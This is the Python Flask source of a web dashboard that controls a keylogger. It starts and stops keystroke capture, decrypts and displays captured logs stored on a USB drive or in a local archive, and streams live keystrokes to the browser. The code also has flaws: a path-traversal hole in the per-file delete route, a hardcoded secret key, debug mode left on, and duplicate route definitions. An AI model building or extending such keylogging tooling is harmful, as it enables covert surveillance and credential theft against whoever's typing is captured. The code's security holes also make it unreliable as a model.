# dashboard_app.py
import os
import sys
import time
import threading
from flask import Flask, render_template, request, redirect, url_for, flash, send_file, jsonify, Response
from capture_controller import controller
from device_monitor import is_connected, PENDRIVE_LOG_DIR
from encrypt_utils import decrypt_bytes

APP_ROOT = os.path.dirname(__file__)
ARCHIVE_DIR = os.path.join(APP_ROOT, "archive")
PENDRIVE_LOG_DIR = PENDRIVE_LOG_DIR  # from device_monitor

os.makedirs(ARCHIVE_DIR, exist_ok=True)

app = Flask(__name__)
from datetime import datetime as _dt
@app.template_filter('datetimeformat')
def _jinja2_datetimeformat(ts):
    try:
        return _dt.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)

app.secret_key = "devsecret-local"

def list_archives():
    files = []
    # combine pendrive logs and local archive (pendrive first if exists)
    locations = []
    if is_connected():
        locations.append(PENDRIVE_LOG_DIR)
    locations.append(ARCHIVE_DIR)
    seen = set()
    for loc in locations:
        try:
            for fname in os.listdir(loc):
                if not fname.endswith(".enc.bak"):
                    continue
                if fname in seen:
                    continue
                seen.add(fname)
                path = os.path.join(loc, fname)
                files.append({
                    "name": fname,
                    "path": path,
                    "mtime": os.path.getmtime(path),
                    "size": os.path.getsize(path),
                    "location": loc
                })
        except Exception:
            continue
    # sort by mtime desc
    files.sort(key=lambda x: x["mtime"], reverse=True)
    return files

@app.route("/")
def index():
    archives = list_archives()
    return render_template("index.html", archives=archives, capture_running=controller.is_running(), pendrive_connected=is_connected())

@app.route("/decrypt/<fname>")
def decrypt_file(fname):
    safe = os.path.basename(fname)
    # find file in archive list
    archives = list_archives()
    path = None
    for a in archives:
        if a["name"] == safe:
            path = a["path"]
            break
    if not path or not os.path.exists(path):
        flash("File not found", "danger")
        return redirect(url_for("index"))
    try:
        with open(path, "rb") as f:
            enc = f.read()
        data = decrypt_bytes(enc).decode("utf-8", errors="replace")
    except Exception as e:
        flash(f"Decryption failed: {e}", "danger")
        data = ""
    return render_template("view.html", filename=safe, contents=data)

@app.route("/download/<fname>")
def download(fname):
    safe = os.path.basename(fname)
    # find path
    archives = list_archives()
    path = None
    for a in archives:
        if a["name"] == safe:
            path = a["path"]
            break
    if not path:
        flash("File not found", "danger")
        return redirect(url_for("index"))
    return send_file(path, as_attachment=True)

@app.route("/start_capture", methods=["POST"])
def start_capture():
    # require pendrive for capture to start? allow start even if not connected but warn
    require_pendrive = request.form.get("require_pendrive", "true").lower() == "true"
    if require_pendrive and not is_connected():
        flash("Pendrive not connected — plug /mnt/secure_usb in order to store logs there.", "warning")
        return redirect(url_for("index"))
    started = controller.start()
    if not started:
        flash("Capture already running", "info")
    else:
        flash("Capture started", "success")
    return redirect(url_for("index"))

@app.route("/stop_capture", methods=["POST"])
def stop_capture():
    stopped = controller.stop()
    if not stopped:
        flash("Capture is not running", "info")
    else:
        flash("Capture stopped", "success")
    return redirect(url_for("index"))

@app.route("/stream")
def stream():
    print("[dashboard] SSE client connected")
    def event_stream():
        yield from controller.stream_live()
    return Response(event_stream(), mimetype="text/event-stream")


@app.route("/delete_all", methods=["POST"])
def delete_all():
    # delete all .enc.bak files from pendrive and local archive (ask user caution)
    archives = list_archives()
    removed = 0
    for a in archives:
        try:
            os.remove(a["path"])
            removed += 1
        except Exception:
            pass
    flash(f"Deleted {removed} archive files", "info")
    return redirect(url_for("index"))

@app.route("/activity")
def activity():
    # simple stats: number of files per day (last 7 days)
    archives = list_archives()
    counts = {}
    for a in archives:
        ts = time.gmtime(a["mtime"])
        day = time.strftime("%Y-%m-%d", ts)
        counts[day] = counts.get(day, 0) + 1
    # return last 7 days in order
    days = []
    vals = []
    for i in range(6, -1, -1):
        d = time.strftime("%Y-%m-%d", time.gmtime(time.time() - i*86400))
        days.append(d)
        vals.append(counts.get(d, 0))
    return jsonify({"labels": days, "values": vals})

@app.route('/delete/<path:filename>', methods=['POST'])
def delete_file(filename):
    """
    Delete a specific archive file from either local or USB storage.
    """
    import os
    from flask import redirect, url_for, flash

    local_path = os.path.join("archive", filename)
    usb_path = os.path.join("/mnt/secure_usb/logs", filename)

    deleted = False

    # Try deleting from both locations
    for path in [local_path, usb_path]:
        if os.path.exists(path):
            try:
                os.remove(path)
                deleted = True
            except Exception as e:
                flash(f"Error deleting {filename}: {e}", "error")
                return redirect(url_for('index'))

    if deleted:
        flash(f"Deleted: {filename}", "success")
    else:
        flash(f"File not found: {filename}", "error")

    return redirect(url_for('index'))

# ---------- LIVE CAPTURE PREVIEW ----------
@app.route("/live")
def live_capture():
    """Live keystroke capture preview page"""
    try:
        with open("live_preview.txt", "r") as f:
            content = f.read()
    except FileNotFoundError:
        content = "[No live capture yet]"
    return render_template("live.html", content=content)


@app.route("/stream")
def live_stream():
    """Stream live keystrokes via Server-Sent Events (SSE)."""
    def event_stream():
        last_data = ""
        while True:
            try:
                with open("live_preview.txt", "r") as f:
                    data = f.read()
            except FileNotFoundError:
                data = ""
            if data != last_data:
                last_data = data
                yield f"data: {data}\n\n"
            time.sleep(1)
    return Response(event_stream(), mimetype="text/event-stream")

@app.route("/live")
def live():
    return render_template("live.html")


if __name__ == "__main__":
    app.run(debug=True, threaded=True)
